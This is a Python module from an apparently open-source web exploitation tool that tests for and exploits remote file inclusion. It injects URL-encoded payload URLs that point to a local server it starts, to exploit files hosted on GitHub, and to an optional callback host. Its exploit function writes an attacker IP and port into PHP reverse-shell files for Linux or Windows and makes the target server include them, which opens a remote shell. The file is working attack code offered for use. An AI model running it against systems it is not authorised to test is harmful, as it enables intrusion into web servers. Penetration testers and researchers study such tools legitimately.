"""RFI"""
import os
import threading
import fileinput
from random import randint

from src.httpreqs import request
from src.configs.config import rfi_test_port
from src.utils.arguments import init_args
from src.utils.args_check import scriptDirectory
from src.servers.HTTPServer import serve_forever
from src.configs import config
from src.utils import colors
from src.utils.info import printInfo


def random_with_N_digits(n):
    """
    Random number to the n'th power generator
    
    Returns int
    """
    range_start = 10 ** (n - 1)
    range_end = (10**n) - 1
    return randint(range_start, range_end)


def test_rfi(url, post):
    """Test RFI"""
    args  = init_args()
    if args['verbose']:
        print(colors.blue("[i]") + " Testing remote file inclusion...")

    # Localhost RFI test
    if args['lhost']:
        try:
            # Setup exploit serving path
            if os.access(scriptDirectory + os.sep + "src/exploits", os.R_OK):
                config.webDir = scriptDirectory + os.sep + "src/exploits"
            else:
                print(
                    colors.red("[-]")
                    + "Directory '"
                    + scriptDirectory
                    + "/src/exploits' can't be accessed. Cannot setup local web server for RFI test."
                )
                return

            threading.Thread(target=serve_forever).start()
            rfiTest = []
            rfiTest.append(
                f"http%3A%2F%2F{args['lhost']}%3A{rfi_test_port}%2Fysvznc"
            )
            rfiTest.append(
                f"http%3A%2F%2F{args['lhost']}%3A{rfi_test_port}%2Fysvznc%00"
            )
            rfiTest.append(
                f"http%3A%2F%2F{args['lhost']}%3A{rfi_test_port}%2Fysvznc.gif"
            )
            rfiTest.append(
                f"http%3A%2F%2F{args['lhost']}%3A{rfi_test_port}%2Fysvznc.png"
            )
            rfiTest.append(
                f"http%3A%2F%2F{args['lhost']}%3A{rfi_test_port}%2Fysvznc.jsp"
            )
            rfiTest.append(
                f"http%3A%2F%2F{args['lhost']}%3A{rfi_test_port}%2Fysvznc.html"
            )
            rfiTest.append(
                f"http%3A%2F%2F{args['lhost']}%3A{rfi_test_port}%2Fysvznc.php"
            )

            for test in rfiTest:
                u, reqHeaders, postTest = request.prepareRequest(
                    args['param'], test, url, post
                )
                _, br = request.REQUEST(
                    u, reqHeaders, postTest, config.proxies, "RFI", "RFI"
                )
                if not br:
                    return
                if args['quick']:
                    return
        except:
            raise

    # Internet RFI test
    if args['verbose']:
        print(colors.blue("[i]") + " Trying to include internet-hosted file...")

    pylds = []
    pylds.append(
        "https%3A%2F%2Fgithub.com%2Fhansmach1ne%2FLFImap%2Fblob%2Fmain%2Fsrc%2Fexploits%2Fexploit.php"
    )
    pylds.append(
        "https%3A%2F%2Fgithub.com%2Fhansmach1ne%2FLFImap%2Fblob%2Fmain%2Fsrc%2Fexploits%2Fexploit.jsp"
    )
    pylds.append(
        "https%3A%2F%2Fgithub.com%2Fhansmach1ne%2FLFImap%2Fblob%2Fmain%2Fsrc%2Fexploits%2Fexploit.html"
    )
    pylds.append(
        "https%3A%2F%2Fgithub.com%2Fhansmach1ne%2FLFImap%2Fblob%2Fmain%2Fsrc%2Fexploits%2Fexploit.gif"
    )
    pylds.append(
        "https%3A%2F%2Fgithub.com%2Fhansmach1ne%2FLFImap%2Fblob%2Fmain%2Fsrc%2Fexploits%2Fexploit.png"
    )

    if args['callback']:
        if not args['callback'].startswith("http://"):
            callbackTest = (
                "http://" + args['callback'] + "%2F" + str(random_with_N_digits(5))
            )
        pylds.append(callbackTest)

    for pyld in pylds:
        try:
            u, reqHeaders, postTest = request.prepareRequest(
                args['param'], pyld, url, post
            )
            _, br = request.REQUEST(
                u, reqHeaders, postTest, config.proxies, "RFI", "RFI"
            )
            if not br:
                return
            if args['quick']:
                return
        except:
            raise


def prepareRfiExploit(payloadFile, temporaryFile, ip, port):
    # Copy a file from exploits/reverse_shell.php
    if not os.path.exists(payloadFile):
        print(
            colors.red("[-]")
            + " Cannot locate '"
            + payloadFile
            + "'. Skipping RFI exploit..."
        )
        return
    else:
        # Prepare file that will be included
        with open(payloadFile, "r", encoding="latin1") as f:
            with open(temporaryFile, "w", encoding="latin1") as r:
                lines = f.readlines()
                for line in lines:
                    line = line[:-1]
                    r.write(line + "\n")

    # Modify reverse_shell_temp.php ip and port number values
    with fileinput.FileInput(temporaryFile, inplace=True) as file:
        for line in file:
            # This redirects stdout to a file, replacing the ip and port values as needed
            print(line.replace("IP_ADDRESS", ip))

    with fileinput.FileInput(temporaryFile, inplace=True) as file:
        for line in file:
            print(line.replace("PORT_NUMBER", str(port)))


def exploit_rfi(exploit, method, ip, port):
    """Exploit RFI"""
    args  = init_args()
    if args['f']:
        return

    url = exploit["GETVAL"]
    printInfo(ip, port, "php", "Remote File Inclusion")
    if args['mode'] == "post":
        if exploit["OS"] == "linux":
            prepareRfiExploit(
                config.webDir + os.path.sep + "/reverse_shell_lin.php",
                config.webDir + os.path.sep + "reverse_shell_lin_tmp.php",
                ip,
                port,
            )
            request.REQUEST(
                url,
                args['httpheaders'],
                exploit["POSTVAL"].replace(config.tempArg, "reverse_shell_lin_tmp.php"),
                config.proxies,
                "",
                "",
            )
        else:
            prepareRfiExploit(
                config.webDir + os.path.sep + "/reverse_shell_win.php",
                config.webDir + os.path.sep + "reverse_shell_win_tmp.php",
                ip,
                port,
            )
            request.REQUEST(
                url,
                args['httpheaders'],
                exploit["POSTVAL"].replace(config.tempArg, "reverse_shell_win_tmp.php"),
                config.proxies,
                "",
                "",
            )
        return

    # It is a GET
    if exploit["OS"] == "windows":
        prepareRfiExploit(
            config.webDir + os.path.sep + "/reverse_shell_win.php",
            config.webDir + os.path.sep + "reverse_shell_win_tmp.php",
            ip,
            port,
        )
        request.REQUEST(
            url.replace(config.tempArg, "reverse_shell_win_tmp.php"),
            args['httpheaders'],
            "",
            config.proxies,
            "",
            "",
        )
    else:
        prepareRfiExploit(
            config.webDir + os.path.sep + "/reverse_shell_lin.php",
            config.webDir + os.path.sep + "reverse_shell_lin_tmp.php",
            ip,
            port,
        )
        request.REQUEST(
            url.replace(config.tempArg, "reverse_shell_lin_tmp.php"),
            args['httpheaders'],
            "",
            config.proxies,
            "",
            "",
        )
    return
